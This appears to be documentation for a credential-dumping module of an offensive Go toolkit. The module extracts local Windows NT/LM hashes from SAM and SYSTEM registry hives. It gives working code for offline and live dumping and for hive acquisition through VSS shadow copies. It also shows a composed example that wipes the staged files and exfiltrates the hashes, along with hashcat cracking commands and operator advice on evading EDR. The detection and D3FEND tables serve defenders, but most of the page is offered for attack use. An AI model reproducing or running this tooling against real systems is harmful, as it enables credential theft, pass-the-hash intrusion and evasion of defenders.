# SAM hive dump

[← credentials index](README.md) · [docs/index](../../index.md)

## TL;DR

You want the local Windows account hashes (NT/LM) for the
machine — Administrator's hash for pass-the-hash, local
service accounts, etc. The hashes live in the `SAM` registry
hive, encrypted with a key derived from the `SYSTEM` hive's
"syskey".

Two paths depending on what you have on disk:

| You have… | Use | Constraint |
|---|---|---|
| Both `SAM` + `SYSTEM` hive bytes (offline analysis or pre-dumped) | [`Decrypt`](#decryptsam-system-byte-account-error) | Pure-Go, cross-platform |
| Live target — need to acquire the hives first | [`LiveDump`](#livedump) (calls `reg save`) | Windows + admin; **loud** — `reg save HKLM\SAM` is a textbook EDR signal |

What this DOES achieve:

- Pure-Go REGF (registry hive) parser — no Win32 dependency
  for the decryption side.
- Full crypto chain: syskey reassembly from `Lsa\{JD,Skew1,GBG,Data}`
  class strings, AES-128-CBC unwrap of hashed bootkey,
  per-user RID-keyed RC4 + DES to recover the NT hash.

What this does NOT achieve:

- **NTDS.dit (domain controller's AD database) is OUT OF SCOPE** —
  separate format, separate code path. SAM is local accounts only.
- **No DPAPI / SECURITY hive parsing** — those carry per-user
  credential blobs (browser passwords, scheduled task creds).
  This package does NT hashes only.
- **No cleartext** — NT hashes are one-way. For cleartext
  credentials, dump LSASS instead ([`credentials/lsassdump`](lsassdump.md)
  + [`credentials/sekurlsa`](sekurlsa.md)).
- **`LiveDump` is observable** — `reg save HKLM\SAM` requires
  `SeBackupPrivilege` and shows up in EDR command-line and
  registry-access telemetry. Prefer offline parse from
  pre-acquired hives when possible.

## Primer

Local Windows accounts live in the `SAM` registry hive under
`SAM\Domains\Account`. Each user's NT/LM hash is stored encrypted —
two layers of crypto stand between the on-disk bytes and a usable
hash:

1. The **boot key** (syskey) is split across four `Lsa\{JD,Skew1,GBG,Data}`
   class strings in the `SYSTEM` hive, permuted at boot to defeat
   trivial copies. Reassembling it requires the SYSTEM hive.
2. The boot key encrypts the **hashed bootkey** stored in
   `SAM\Domains\Account\F` — itself an AES-128-CBC blob keyed on
   `MD5(bootKey || rid_str || qwerty || rid_str)` (legacy revision
   uses RC4).
3. The hashed bootkey then derives per-user keys (RC4 or AES-128-CBC
   depending on the revision tag in `F`). Per-user keys decrypt the
   16-byte LM and NT hash blobs in `SAM\Domains\Account\Users\<RID>\V`.
4. Modern Windows (10 1607+) also wraps the hashes in a final DES
   permutation keyed on the RID — same algorithm Windows itself
   uses to look up the hash at logon.

`samdump.Dump` runs the entire chain in process memory with no
syscalls. The hive bytes can come from anywhere — `reg save`, VSS
shadow copy, raw NTFS read, recon/shadowcopy, or pulled offline
from a backup. The package itself opens nothing.

## How It Works

```mermaid
flowchart TD
    SYS[SYSTEM hive bytes] --> EBK[extractBootKey<br>permute Lsa class strings]
    EBK -->|16-byte boot key| HBK
    SAM[SAM hive bytes] --> RDF[readDomainAccountF<br>AES-encrypted blob]
    RDF --> HBK[deriveDomainKey<br>AES-128-CBC]
    HBK -->|hashed bootkey| LU
    SAM --> LU[listUserRIDs<br>walk Users key]
    LU --> PV[parseUserV<br>extract username + LM/NT enc]
    PV --> DEC[decryptUserNT / decryptUserLM<br>per-RID DES-permute<br>+ AES-128-CBC or RC4]
    DEC --> ACC[Account&#123;Username, RID, NT, LM&#125;]
```



Implementation details:

- The REGF reader (`hive.go`) walks named keys and value records
  through `nk` / `vk` cells without depending on `golang.org/x/sys`
  or any Windows-only API — cross-platform out of the box.
- Per-user failures are accumulated on `Result.Warnings` rather
  than aborting the dump; structural failures (missing boot key,
  malformed `F`, no `Users` key) return `ErrDump`.
- `Account.Pwdump` renders the canonical `username:RID:LM:NT:::`
  format consumed by hashcat (`-m 1000`), John (`--format=NT`),
  CrackMapExec NTLM hash auth, and impacket secretsdump.

## API → godoc

[`pkg.go.dev/github.com/oioio-space/maldev/credentials/samdump`](https://pkg.go.dev/github.com/oioio-space/maldev/credentials/samdump) is the authoritative
reference for every exported symbol. This page teaches the
*concepts*; the godoc is the *specification*.

## Examples

### Simple — offline hives

```go
import (
    "fmt"
    "os"

    "github.com/oioio-space/maldev/credentials/samdump"
)

system, _ := os.Open(`/loot/SYSTEM`)
defer system.Close()
sam, _ := os.Open(`/loot/SAM`)
defer sam.Close()

sysFI, _ := system.Stat()
samFI, _ := sam.Stat()

res, err := samdump.Dump(system, sysFI.Size(), sam, samFI.Size())
if err != nil {
    panic(err)
}
fmt.Print(res.Pwdump())
```

### With password history — feed hashcat every hash a user has ever held

```go
import (
    "fmt"
    "os"

    "github.com/oioio-space/maldev/credentials/samdump"
)

system, _ := os.Open(`/loot/SYSTEM`)
defer system.Close()
sam, _ := os.Open(`/loot/SAM`)
defer sam.Close()
sysFI, _ := system.Stat()
samFI, _ := sam.Stat()

res, _ := samdump.Dump(system, sysFI.Size(), sam, samFI.Size())

// Current + every historical hash, ready to pipe into:
//   hashcat -m 1000 -a 0 hashes.txt rockyou.txt
fmt.Print(res.PwdumpWithHistory())

// Or per-account introspection — count how many prior NT hashes
// each user has, useful for picking high-value targets first.
for _, a := range res.Accounts {
    fmt.Printf("%s (RID %d): current + %d historical NT hashes\n",
        a.Username, a.RID, len(a.NTHistory))
}
```

### Composed — live host, cleanup, exfil

```go
import (
    "os"

    "github.com/oioio-space/maldev/credentials/samdump"
    "github.com/oioio-space/maldev/cleanup/wipe"
)

dir, _ := os.MkdirTemp("", "")
res, sysPath, samPath, err := samdump.LiveDump(dir)
defer func() {
    _ = wipe.File(sysPath)
    _ = wipe.File(samPath)
    _ = os.RemoveAll(dir)
}()
if err != nil {
    panic(err)
}
exfilPwdump(res.Pwdump())
```

### Advanced — VSS shadow-copy acquisition

`reg save` is loud. For better OPSEC, acquire the hives via VSS
shadow copies through [`recon/shadowcopy`](../recon/) and feed the
files into the offline `Dump` path:

```go
sc, _ := shadowcopy.Create()
defer sc.Delete()

sysReader, _ := sc.Open(`Windows\System32\config\SYSTEM`)
samReader, _ := sc.Open(`Windows\System32\config\SAM`)

res, err := samdump.Dump(sysReader, sysReader.Size(),
    samReader, samReader.Size())
```

See [`ExampleDump`](../../../credentials/samdump/samdump_example_test.go)
for the runnable variant.

## OPSEC & Detection

| Artefact | Where defenders look |
|---|---|
| `reg save HKLM\SAM` / `HKLM\SYSTEM` | Sysmon Event 1 (process creation) — `reg.exe` with `save` is one of the highest-fidelity credential-dumping signals |
| Two `.hive` files written to a writable directory | EDR file-write telemetry; staging directories under `%TEMP%` are correlated with credential dumping |
| `RegSaveKeyEx` Windows API call | ETW Microsoft-Windows-Kernel-Registry; bypassable via direct `NtSaveKey` syscall |
| Read access to `HKLM\SAM` SD | Defender ASR rule `"Block credential stealing from the Windows local security authority subsystem"` (LSA-only, but heuristics overlap) |

**D3FEND counters:**

- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/)
  — flags `reg.exe save` lineage.
- [D3-FCA](https://d3fend.mitre.org/technique/d3f:FileContentAnalysis/)
  — REGF magic on disk in atypical paths.
- [D3-SICA](https://d3fend.mitre.org/technique/d3f:SystemConfigurationDatabaseAnalysis/)
  — registry hive-handle telemetry.

**Hardening for the operator:**

- Prefer offline acquisition (VSS via `recon/shadowcopy`, raw NTFS
  read, backup files) over `LiveDump`.
- Stage hive bytes through an in-memory `io.ReaderAt` (e.g.
  `bytes.NewReader`) to avoid the `.hive` files on disk altogether.
- Wipe the `dir` immediately after parsing — `cleanup/wipe.File`
  zeroes the bytes before unlinking.

## MITRE ATT&CK

| T-ID | Name | Sub-coverage | D3FEND counter |
|---|---|---|---|
| [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | OS Credential Dumping: Security Account Manager | full — offline + LiveDump | D3-PSA, D3-FCA, D3-SICA |

## Limitations

- **Local accounts only.** SAM holds only the workstation's local
  users. Domain credentials live in `NTDS.dit` on the DC; use
  separate tooling (impacket secretsdump remote, mimikatz `lsadump::dcsync`).
- **History coverage.** Per-account NT and LM password-history
  blobs are now decoded and surfaced as `Account.NTHistory` /
  `Account.LMHistory` (most-recent-first). Render via
  `Account.PwdumpHistory()` / `Result.PwdumpWithHistory()`. Each
  historical NT hash is a full pass-the-hash candidate against any
  host that hasn't enforced rotation. Windows default
  `MaximumPasswordHistory=24` — expect up to 24 historical hashes
  per account. LM history is empty by default on Win10 1607+.
- **DPAPI / cached creds out of scope.** Domain cached credentials
  (`Cache{N}`) live in `SECURITY` hive; `SECURITY` parsing is not
  in this package.
- **LiveDump is loud.** `reg.exe save` lights up every behavioral
  EDR. Plan for offline acquisition wherever the operational
  context allows.
- **AES revision only validated against Win10 1607+.** Older XP/2003
  RC4-keyed hives use the legacy code path; tested less recently.

## See also

- [LSASS dump (live process memory)](../collection/lsass-dump.md) —
  cousin path for live cached credentials.
- [`credentials/sekurlsa`](sekurlsa.md) — companion LSASS extractor.
- [`recon/shadowcopy`](../recon/) — VSS-based hive acquisition.
- [`cleanup/wipe`](../cleanup/) — secure deletion of the on-disk
  hive copies.
- [Operator path](../../by-role/operator.md) — credential-harvest
  decision tree.
- [Detection eng path](../../by-role/detection-eng.md#credential-access)
  — SAM-dump telemetry.
